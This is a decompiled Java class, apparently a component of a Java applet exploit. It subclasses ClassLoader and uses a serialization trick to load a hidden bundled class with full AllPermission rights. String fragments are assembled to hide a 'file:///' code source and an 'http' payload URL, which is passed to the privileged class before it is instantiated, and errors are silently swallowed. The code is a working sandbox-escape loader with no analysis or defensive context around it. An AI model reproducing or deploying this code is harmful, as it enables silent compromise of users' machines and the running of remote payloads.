// 
// Decompiled by Procyon v0.5.30
// 

package zzz.ttt;

import java.io.InputStream;
import java.security.PermissionCollection;
import java.security.ProtectionDomain;
import java.security.CodeSource;
import java.security.Permission;
import java.security.AllPermission;
import java.security.Permissions;
import java.security.cert.Certificate;
import java.net.URL;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class a13d8 extends ClassLoader implements Serializable
{
    private static final long serialVersionUID = 6812622870313961944L;
    public static a13d8 instance;
    public static String test;
    
    private void writeObject(final ObjectOutputStream objectOutputStream) throws IOException, ClassNotFoundException {
        objectOutputStream.defaultWriteObject();
    }
    
    private void readObject(final ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException {
        a13d8.instance = this;
        objectInputStream.defaultReadObject();
    }
    
    public void bRP(final String s, final String s2) throws IOException {
        try {
            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            final byte[] array = new byte[8192];
            final InputStream resourceAsStream = this.getClass().getResourceAsStream("/zz" + "z/ttt/a15" + "00b0.cl" + "ass");
            String string = "";
            int read;
            while ((read = resourceAsStream.read(array)) > 0) {
                final String string2 = string + "/";
                string = string2 + string2 + string2;
                byteArrayOutputStream.write(array, 0, read);
            }
            final String s3 = "gfilar:st/";
            final byte[] byteArray = byteArrayOutputStream.toByteArray();
            final URL url = new URL(s3.substring(1, 4) + "e" + s3.substring(6, 7) + string.substring(0, 3));
            final Certificate[] array2 = new Certificate[0];
            final Permissions permissions = new Permissions();
            permissions.add(new AllPermission());
            final Class<?> defineClass = this.defineClass("zzz.ttt.a1500b0", byteArray, 0, byteArray.length, new ProtectionDomain(new CodeSource(url, array2), permissions));
            final String s4 = "zatv";
            if (defineClass != null) {
                defineClass.getField("d" + s4.substring(1, 3) + "a").set(defineClass.newInstance(), "h" + s4.substring(2, 3) + "t" + s.substring(3) + "kls");
                defineClass.newInstance();
            }
        }
        catch (Exception ex) {}
    }
    
    static {
        a13d8.instance = null;
        a13d8.test = "";
    }
}
